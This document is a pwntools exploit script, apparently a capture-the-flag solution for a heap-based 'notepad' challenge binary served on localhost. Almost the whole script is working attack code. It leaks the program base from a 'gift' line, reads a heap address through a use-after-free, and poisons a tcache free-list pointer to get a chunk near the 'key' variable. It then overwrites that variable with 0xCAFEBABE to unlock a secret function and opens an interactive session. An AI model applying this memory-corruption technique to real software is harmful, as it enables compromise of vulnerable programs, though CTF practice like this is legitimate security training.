#!/usr/bin/env python3

# ruff: noqa: F403, F405


from pwn import *
from pwnlib import gdb

elf = context.binary = ELF("./notepad_patched", checksec=False)
binary_path = elf.path
cwd = str(Path.cwd())


gdb.binary = lambda: "gef-bata24"


def start(argv=[], *a, **kw):
    nc = "nc localhost 1341"
    nc = nc.split()
    host = args.HOST or nc[1]
    port = int(args.PORT or nc[2])
    if args.REMOTE:
        return remote(host, port)
    else:
        args_ = [binary_path] + argv
        if args.NA:  # NOASLR
            args_ = ["setarch", "-R"] + args_
        if args.GDB:
            return gdb.debug(
                args=args_,
                env=env,
                gdbscript=gdbscript,
                api=True,
                # sysroot=cwd,
                sysroot=None,
            )
        return process(args_, env=env, *a, **kw)


env = {}
if len(env) == 0:
    env = None

gdbscript = """
b *main+113
c
"""


def create(idx: int, size: int, data: bytes):
    io.sendlineafter(b"> ", b"1")
    io.sendlineafter(b"> ", str(idx).encode())
    io.sendlineafter(b"> ", str(size).encode())
    io.sendlineafter(b"> ", data)


def view(idx: int):
    io.sendlineafter(b"> ", b"2")
    io.sendlineafter(b"> ", str(idx).encode())


def edit(idx: int, data: bytes):
    io.sendlineafter(b"> ", b"3")
    io.sendlineafter(b"> ", str(idx).encode())
    io.sendlineafter(b"> ", data)


def remove(idx: int):
    io.sendlineafter(b"> ", b"4")
    io.sendlineafter(b"> ", str(idx).encode())


def secret():
    io.sendlineafter(b"> ", b"5")


def exit_():
    io.sendlineafter(b"> ", b"6")


io = start()

io.recvuntil(b"gift: ")
leak = int(io.recvline().strip(), 16)
elf.address = leak - elf.sym["main"]
log.info(f"{elf.address=:#x}")

create(0, 0x40, b"abc")
create(1, 0x40, b"foo")
create(2, 0x10, b"pad")
remove(0)
remove(1)
view(1)

heap_leak = u64(io.recv(6).ljust(8, b"\x00"))
heap_base = heap_leak - 0x260
log.info(f"{heap_leak=:#x}")

edit(1, p64(elf.sym["key"] - 0x4))
create(3, 0x40, b"bar")
create(4, 0x40, b"\x00" * 0x4 + p64(0xCAFEBABE))
secret()

io.interactive()
